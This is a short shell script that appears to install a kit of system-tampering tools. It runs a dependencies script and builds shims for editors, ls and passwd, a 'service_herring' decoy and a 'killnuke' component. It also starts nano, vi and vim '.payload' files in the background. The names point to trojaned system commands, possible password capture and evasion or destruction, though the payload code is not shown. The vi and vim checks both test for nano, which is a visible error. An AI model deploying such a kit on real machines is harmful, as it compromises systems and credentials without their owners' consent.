chmod +x ../dependencies.sh
../dependencies.sh
echo Installed dependencies

# Editor_shim
cd ../editor_shim
chmod +x build.sh
./build.sh

if [ `which nano` ]; then
    ./nano.payload &
fi

if [ `which nano` ]; then
    ./vi.payload &
fi

if [ `which nano` ]; then
    ./vim.payload &
fi

echo Installed editor_shim

# ls_shim
cd ../ls_shim
chmod +x install.sh
./install.sh
echo Installed ls_shim

# service_herring
cd ../service_herring
chmod +x install.sh
./install.sh
echo Installed service_herring

# passwd_shim
cd ../passwd_shim
chmod +x install.sh
./install.sh

# Basic stuff
cd ../basic
chmod +x basic-stuff.sh
./basic-stuff.sh
echo Installed basic stuff

# Killnuke
cd killnuke
chmod +x killnuke.sh
./killnuke.sh
echo Installed killnuke